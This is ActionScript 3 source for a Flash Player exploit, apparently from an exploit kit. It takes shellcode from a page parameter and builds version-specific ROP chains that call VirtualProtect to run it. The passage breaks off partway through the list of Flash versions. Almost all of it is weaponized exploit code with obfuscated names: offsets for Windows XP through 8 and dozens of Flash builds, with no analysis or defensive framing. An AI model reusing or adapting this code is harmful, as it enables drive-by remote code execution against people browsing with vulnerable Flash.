//Compile with mxmlc blah.as -o blah.swf
package
{
    import flash.system.Capabilities;
    import flash.display.Sprite;
    import flash.utils.ByteArray;
    import __AS3__.vec.Vector;
    import flash.system.ApplicationDomain;
    import avm2.intrinsics.memory.*;
    
    public class Vickers extends Sprite
    {
        
        public static var shellcode:String;
        
        public function Vickers()
        {
            var params = root.loaderInfo.parameters;
            shellcode = params["id"];
            while (true)
            {
                if (exploit()) break;
            };
        }
        
        public function makejaiua(vftableAddr:*, scAddr:*):ByteArray
        {
            var kzkxuuao = null;
            switch (Capabilities.os.toLowerCase())
            {
                case "windows xp":
                case "windows vista":
                case "windows server 2003 r2":
                case "windows server 2003":
                case "windows 7":
                case "windows 7 x64":
                case "windows server 2008 r2":
                case "windows server 2008":
                    kzkxuuao = makejaiuaWinOther(vftableAddr, scAddr);
                    break;
                case "windows 8":
                case "windows 8 x64":
                    kzkxuuao = makejaiuaWin8(vftableAddr, scAddr);
                    break;
                default:
                    return (null);
            };
            return (kzkxuuao);
        }
        
        public function makejaiuaWin8(vftableAddr:*, scAddr:*):ByteArray
        {
            var flash_base:uint = vftableAddr;
            var flash_end:uint;
            var paeikkzkxuuao:ByteArray = new ByteArray();
            paeikkzkxuuao.position = 0;
            paeikkzkxuuao.endian = "littleEndian";
            paeikkzkxuuao.writeUnsignedInt((scAddr + 4));
            switch (Capabilities.version.toLowerCase())
            {
                case "win 11,3,372,94":
                    flash_base = (flash_base - 9518744);
                    flash_end = (flash_base + 0xB10000);
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 0x401404)); // add esp, 0x44; ret
                    paeikkzkxuuao.position = 64;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 0x26525));  // xchg eax, esp; ret
                    paeikkzkxuuao.position = 76;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 0x10c5));   // pop eax; ret
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 0x817420)); // ptr to KERNEL32!VirtualProtectStub
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 0x9e16));   // mov eax, dword ptr [eax]; ret
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 0xcc022));  // push eax; ret
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 0x3157c));  // jmp esp ; ret after VirtualProtect
                    paeikkzkxuuao.writeUnsignedInt(scAddr);
                    paeikkzkxuuao.writeUnsignedInt(0x1000);
                    paeikkzkxuuao.writeUnsignedInt(0x40);
                    paeikkzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,3,375,10":
                    flash_base = (flash_base - 9589392);
                    flash_end = (flash_base + 0xB15000);
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 4220004));
                    paeikkzkxuuao.position = 64;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 142215));
                    paeikkzkxuuao.position = 76;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 4293));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 8504352));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 40214));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 840082));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 202134));
                    paeikkzkxuuao.writeUnsignedInt(scAddr);
                    paeikkzkxuuao.writeUnsignedInt(0x1000);
                    paeikkzkxuuao.writeUnsignedInt(64);
                    paeikkzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,3,376,12":
                    flash_base = (flash_base - 9593552);
                    flash_end = (flash_base + 0xB16000);
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 4220740));
                    paeikkzkxuuao.position = 64;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 142023));
                    paeikkzkxuuao.position = 76;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 4293));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 8508448));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 39878));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 839538));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 201958));
                    paeikkzkxuuao.writeUnsignedInt(scAddr);
                    paeikkzkxuuao.writeUnsignedInt(0x1000);
                    paeikkzkxuuao.writeUnsignedInt(64);
                    paeikkzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,3,377,15":
                    flash_base = (flash_base - 9589576);
                    flash_end = (flash_base + 0xB15000);
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 4220388));
                    paeikkzkxuuao.position = 64;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 141671));
                    paeikkzkxuuao.position = 76;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 4293));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 8504352));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 39526));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 839698));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 201590));
                    paeikkzkxuuao.writeUnsignedInt(scAddr);
                    paeikkzkxuuao.writeUnsignedInt(0x1000);
                    paeikkzkxuuao.writeUnsignedInt(64);
                    paeikkzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,3,378,5":
                    flash_base = (flash_base - 9589448);
                    flash_end = (flash_base + 0xB15000);
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 4220388));
                    paeikkzkxuuao.position = 64;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 141671));
                    paeikkzkxuuao.position = 76;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 4293));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 8504352));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 39526));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 839698));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 201590));
                    paeikkzkxuuao.writeUnsignedInt(scAddr);
                    paeikkzkxuuao.writeUnsignedInt(0x1000);
                    paeikkzkxuuao.writeUnsignedInt(64);
                    paeikkzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,3,379,14":
                    flash_base = (flash_base - 9597856);
                    flash_end = (flash_base + 0xB17000);
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 4575113));
                    paeikkzkxuuao.position = 64;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 6617808));
                    paeikkzkxuuao.position = 76;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 8149060));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 8512544));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 4907562));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 8147977));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 4046601));
                    paeikkzkxuuao.writeUnsignedInt(scAddr);
                    paeikkzkxuuao.writeUnsignedInt(0x1000);
                    paeikkzkxuuao.writeUnsignedInt(64);
                    paeikkzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,6,602,167":
                    flash_base = (flash_base - 9821704);
                    flash_end = (flash_base + 0xB85000);
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 8405950));
                    paeikkzkxuuao.position = 64;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 27456));
                    paeikkzkxuuao.position = 76;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 4293));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 8791088));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 73494));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 1115794));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 242790));
                    paeikkzkxuuao.writeUnsignedInt(scAddr);
                    paeikkzkxuuao.writeUnsignedInt(0x1000);
                    paeikkzkxuuao.writeUnsignedInt(64);
                    paeikkzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,6,602,171":
                    flash_base = (flash_base - 9821904);
                    flash_end = (flash_base + 0xB85000);
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 8406414));
                    paeikkzkxuuao.position = 64;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 27456));
                    paeikkzkxuuao.position = 76;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 4293));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 8791088));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 73078));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 1116754));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 242380));
                    paeikkzkxuuao.writeUnsignedInt(scAddr);
                    paeikkzkxuuao.writeUnsignedInt(0x1000);
                    paeikkzkxuuao.writeUnsignedInt(64);
                    paeikkzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,6,602,180":
                    flash_base = (flash_base - 9816600);
                    flash_end = (flash_base + 0xB84000);
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 8404478));
                    paeikkzkxuuao.position = 64;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 29514));
                    paeikkzkxuuao.position = 76;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 4293));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 8786992));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 69382));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 175197));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 238732));
                    paeikkzkxuuao.writeUnsignedInt(scAddr);
                    paeikkzkxuuao.writeUnsignedInt(0x1000);
                    paeikkzkxuuao.writeUnsignedInt(64);
                    paeikkzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,7,700,169":
                    flash_base = (flash_base - 10441412);
                    flash_end = (flash_base + 0xC45000);
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 4640769));
                    paeikkzkxuuao.position = 64;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 53338));
                    paeikkzkxuuao.position = 76;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 4293));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 9368732));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 95414));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 1145506));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 2156132));
                    paeikkzkxuuao.writeUnsignedInt(scAddr);
                    paeikkzkxuuao.writeUnsignedInt(0x1000);
                    paeikkzkxuuao.writeUnsignedInt(64);
                    paeikkzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,7,700,202":
                    flash_base = (flash_base - 0x9f5470);
                    flash_end = (flash_base + 0xC45000);
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 0x46c361));
                    paeikkzkxuuao.position = 64;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 0xcc5a));
                    paeikkzkxuuao.position = 76;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 0x10c5));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 0x8ef49c));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 0x17136));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 0x42f0));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 0x40664));
                    paeikkzkxuuao.writeUnsignedInt(scAddr);
                    paeikkzkxuuao.writeUnsignedInt(0x1000);
                    paeikkzkxuuao.writeUnsignedInt(64);
                    paeikkzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,7,700,224":
                    flash_base = (flash_base - 10450228);
                    flash_end = (flash_base + 0xC7A000);
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 4646881));
                    paeikkzkxuuao.position = 64;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 52090));
                    paeikkzkxuuao.position = 76;
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 4293));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 9376924));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 93510));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 1145378));
                    paeikkzkxuuao.writeUnsignedInt((flash_base + 1909483));
                    paeikkzkxuuao.writeUnsignedInt(scAddr);
                    paeikkzkxuuao.writeUnsignedInt(0x1000);
                    paeikkzkxuuao.writeUnsignedInt(64);
                    paeikkzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                default:
                    return (null);
            };
            return (paeikkzkxuuao);
        }
        
        public function makejaiuaWinOther(vftableAddr:*, scAddr:*):ByteArray
        {
            var vftableAddr_copy:uint = vftableAddr;
            var _local_5:uint;
            var kzkxuuao:ByteArray = new ByteArray();
            kzkxuuao.position = 0;
            kzkxuuao.endian = "littleEndian";
            kzkxuuao.writeUnsignedInt((scAddr + 4));
            switch (Capabilities.version.toLowerCase())
            {
                case "win 11,0,1,152":
                    vftableAddr_copy = (vftableAddr_copy - 7628676);
                    _local_5 = (vftableAddr_copy + 0x927000);
                    kzkxuuao.position = 8;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 1041567));
                    kzkxuuao.position = 64;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 1937003));
                    kzkxuuao.position = 80;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4585805));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 6697912));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 2201532));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 3985044));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 2764856));
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,1,102,55":
                    vftableAddr_copy = (vftableAddr_copy - 7633040);
                    _local_5 = (vftableAddr_copy + 0x927000);
                    kzkxuuao.position = 8;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4793772));
                    kzkxuuao.position = 64;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 1939267));
                    kzkxuuao.position = 80;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 2297101));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 6702008));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 3976335));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 3516263));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 2768033));
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,1,102,62":
                    vftableAddr_copy = (vftableAddr_copy - 7628912);
                    _local_5 = (vftableAddr_copy + 0x927000);
                    kzkxuuao.position = 8;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4794156));
                    kzkxuuao.position = 64;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 1939856));
                    kzkxuuao.position = 80;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5126527));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 6702008));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 2920469));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4454837));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 2768325));
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,1,102,63":
                    vftableAddr_copy = (vftableAddr_copy - 7628904);
                    _local_5 = (vftableAddr_copy + 0x927000);
                    kzkxuuao.position = 8;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4794076));
                    kzkxuuao.position = 64;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 1939822));
                    kzkxuuao.position = 80;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5126435));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 6702008));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 2353542));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 3516455));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 2768305));
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,2,202,228":
                    vftableAddr_copy = (vftableAddr_copy - 7726032);
                    _local_5 = (vftableAddr_copy + 0x93F000);
                    kzkxuuao.position = 8;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4947482));
                    kzkxuuao.position = 64;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 2022234));
                    kzkxuuao.position = 80;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 6255948));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 6824832));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5021261));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 6176368));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 2847152));
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,2,202,233":
                    vftableAddr_copy = (vftableAddr_copy - 7729872);
                    _local_5 = (vftableAddr_copy + 0x93F000);
                    kzkxuuao.position = 8;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4947594));
                    kzkxuuao.position = 64;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 2022508));
                    kzkxuuao.position = 80;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4691374));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 6824832));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4164715));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5837496));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 2847021));
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,2,202,235":
                    vftableAddr_copy = (vftableAddr_copy - 7734032);
                    _local_5 = (vftableAddr_copy + 0x940000);
                    kzkxuuao.position = 8;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4947578));
                    kzkxuuao.position = 64;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 2022729));
                    kzkxuuao.position = 80;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5249755));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 6828928));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4261382));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4553024));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 2847456));
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,3,300,257":
                    vftableAddr_copy = (vftableAddr_copy - 8232016);
                    _local_5 = (vftableAddr_copy + 0x9C3000);
                    kzkxuuao.position = 8;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5328586));
                    kzkxuuao.position = 64;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 2069614));
                    kzkxuuao.position = 80;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 6497300));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 7222148));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5022322));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4972967));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 3071572));
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,3,300,273":
                    vftableAddr_copy = (vftableAddr_copy - 8236216);
                    _local_5 = (vftableAddr_copy + 0x9C4000);
                    kzkxuuao.position = 8;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5331930));
                    kzkxuuao.position = 64;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 2070667));
                    kzkxuuao.position = 80;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 6500737));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 7226252));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5142060));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5127634));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 3074828));
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,4,402,278":
                    vftableAddr_copy = (vftableAddr_copy - 8503560);
                    _local_5 = (vftableAddr_copy + 0xA23000);
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5581452));
                    kzkxuuao.position = 64;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 1202409));
                    kzkxuuao.position = 76;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 6927402));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 7480208));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5373116));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5713520));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 3269652));
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,4,402,287":
                    vftableAddr_copy = (vftableAddr_copy - 8507728);
                    _local_5 = (vftableAddr_copy + 0xA24000);
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5582348));
                    kzkxuuao.position = 64;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 1202841));
                    kzkxuuao.position = 76;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 6927143));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 7484304));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5481024));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5107604));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5747979));
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,5,502,110":
                    vftableAddr_copy = (vftableAddr_copy - 11716376);
                    _local_5 = (vftableAddr_copy + 0xEC6000);
                    kzkxuuao.position = 20;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 9813154));
                    kzkxuuao.position = 64;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 448623));
                    kzkxuuao.position = 96;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 9326463));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 10691852));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5731300));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 8910259));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 8630687));
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,5,502,135":
                    vftableAddr_copy = (vftableAddr_copy - 11716400);
                    _local_5 = (vftableAddr_copy + 0xEC6000);
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 1101327));
                    kzkxuuao.position = 64;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4733912));
                    kzkxuuao.position = 76;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4540));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 10691852));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 28862));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 512197));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 1560889));
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,5,502,146":
                    vftableAddr_copy = (vftableAddr_copy - 11716320);
                    _local_5 = (vftableAddr_copy + 0xEC6000);
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 1101327));
                    kzkxuuao.position = 64;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4733912));
                    kzkxuuao.position = 76;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4540));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 10691852));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 28862));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 512197));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 1560889));
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,5,502,149":
                    vftableAddr_copy = (vftableAddr_copy - 11712240);
                    _local_5 = (vftableAddr_copy + 0xEC6000);
                    kzkxuuao.position = 5;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 10373824));
                    kzkxuuao.position = 64;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4331881));
                    kzkxuuao.position = 77;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 9292830));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 10691852));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5731956));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 7150772));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 3344264));
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,6,602,168":
                    vftableAddr_copy = (vftableAddr_copy - 11825816);
                    _local_5 = (vftableAddr_copy + 0xEE9000);
                    kzkxuuao.position = 5;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 9924439));
                    kzkxuuao.position = 64;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4370139));
                    kzkxuuao.position = 77;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 9564155));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 10736920));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5830863));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 9044861));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 7984191));
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,6,602,171":
                    vftableAddr_copy = (vftableAddr_copy - 11834040);
                    _local_5 = (vftableAddr_copy + 0xEEA000);
                    kzkxuuao.position = 5;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 9925589));
                    kzkxuuao.position = 64;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4370636));
                    kzkxuuao.position = 77;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 9564442));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 10741016));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5771380));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 10153408));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 7983199));
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,6,602,180":
                    vftableAddr_copy = (vftableAddr_copy - 11824712);
                    _local_5 = (vftableAddr_copy + 0xEE9000);
                    kzkxuuao.position = 5;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 9923173));
                    kzkxuuao.position = 64;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 4368414));
                    kzkxuuao.position = 77;
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 9562061));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 10736920));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 5828990));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 9042989));
                    kzkxuuao.writeUnsignedInt((vftableAddr_copy + 8661666));
                    kzkxuuao.writeUnsignedInt(scAddr);
                    kzkxuuao.writeUnsignedInt(0x1000);
                    kzkxuuao.writeUnsignedInt(64);
                    kzkxuuao.writeUnsignedInt((scAddr - 4));
                    break;
                case "win 11,7,700,169":
